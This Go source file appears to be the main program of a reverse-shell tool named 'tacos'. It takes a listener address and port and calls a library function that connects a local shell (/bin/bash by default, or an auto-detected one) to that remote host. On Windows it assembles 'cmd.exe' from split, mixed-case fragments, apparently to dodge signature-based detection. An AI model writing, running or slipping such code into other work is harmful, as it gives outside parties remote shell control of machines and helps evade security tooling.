package main

import (
	"flag"
	"fmt"
	"os"
	"runtime"
	"strings"

	"github.com/ariary/tacos/pkg/tacos"
)

var Remote string

func main() {
	//var detect, daemon bool
	var detect bool
	var shell string
	flag.BoolVar(&detect, "detect", false, "Detect default shell to use it in reverse shell")
	//TODO: flag.BoolVar(&daemon, "daemon", false, "Disown the process from the terminal")
	flag.StringVar(&shell, "shell", "/bin/bash", "shell to use for reverse shell") //default /bin/bash
	flag.Parse()

	if runtime.GOOS == "windows" {
		shell = strings.ToLower(fmt.Sprintf("%s%s%s", "Cm", "D.e", "Xe"))
	}

	if detect {
		shell = tacos.DetectDefaultShell()
	}

	if len(os.Args) > 1 {
		Remote = flag.Arg(0)
	}

	if Remote == "" {
		fmt.Println("Usage: tacos [listener_url]:[port]")
		os.Exit(1)
	}

	tacos.ShellReverse(Remote, shell)
}
